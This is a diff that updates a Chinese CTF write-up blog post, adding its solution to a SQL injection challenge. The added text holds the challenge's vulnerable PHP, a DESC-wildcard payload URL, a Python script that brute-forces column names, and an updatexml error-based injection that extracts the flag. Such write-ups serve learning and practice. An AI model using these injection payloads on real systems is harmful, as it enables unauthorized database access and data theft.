@@ -8,7 +8,7 @@ tags:
 date: 2017-07-12 10:20:13
 ---
 
-6月18日的线上赛，今天才补上wp
+6月18日的线上赛，今天才补上wp，9月22日更新SQL注入题
 <!-- more -->
 
 ## 1.根据ip查dns解析记录
@@ -58,4 +58,49 @@ fuzz后发现 &lt; 被过滤了，构造post file=.&lt;./.&lt;./.&lt;./.&lt;./.&
 
 ## 6.sql注入
 
-这道题到最后也没做出来，sql盲注，过滤了`union`和`column_name`，不知道字段名是啥
+这道题到最后也没做出来，报错注入注，过滤了`union`和`column_name`还有`*`，不知道字段名是啥
+
+参考了[http://www.wupco.cn/?p=3764](http://www.wupco.cn/?p=3764)  
+从该文章中可以得知这道注入题的核心代码如下
+```php
+$sql = "desc `error_{$table}`";
+$res = mysql_query($sql);
+if(empty(mysql_fetch_array($res))){
+    echo "<center>no table detail</center>";
+    die();
+}
+
+$sql = "select * from error_${table} where id = $id";
+```
+可以看出通过`desc`语句判断table是否存在，再执行下一个sql语句  
+DESC的语法如下  
+```
+DESC tbl_name [col_name | wild]
+```
+构造payload如下  
+```
+http://114.55.36.69:20680/index.php?table=flag` `a%&id=3
+```
+python脚本如下
+```python
+#!/usr/bin/env
+# -*- coding: utf-8 -*-
+import requests as r
+r1=r.session()
+s="abcdefghijklmnopqrstuvwxyz1234567890_"
+flag=""
+for i in range(50):
+  url="http://114.55.36.69:20680/index.php?table=flag` `{0}%&id=3"
+  for j in s:
+    url2=url.format(str(flag+j))
+    r2=r1.get(url2)
+    if "SQL" in r2.text:
+      flag+=j
+      print flag
+      break
+```
+得到`error_flag`表的字段名为`flag_you_will_never_know`  
+再使用报错注入查询即可拿到flag  
+```
+http://114.55.36.69:20680/index.php?table=news&id=3 -updatexml(1,concat('a=.',(select flag_you_will_never_know from error_flag)),1)#
+```
